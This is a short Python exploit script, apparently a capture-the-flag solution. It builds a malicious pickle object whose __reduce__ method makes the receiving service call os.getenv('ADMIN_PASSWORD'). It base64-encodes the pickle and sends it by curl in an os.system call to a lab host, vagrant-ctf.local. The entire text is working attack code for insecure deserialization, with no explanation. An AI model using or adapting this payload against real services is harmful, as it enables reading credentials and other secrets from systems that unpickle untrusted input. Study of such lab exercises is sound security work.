import pickle
import os
import base64

class Exploit(object):
    def __reduce__(self):
        return (os.getenv, ("ADMIN_PASSWORD",))

exploit = pickle.dumps(Exploit())
payload = base64.b64encode(exploit)
os.system("curl -X POST http://vagrant-ctf.local:30877/text -d '%s'" % payload)
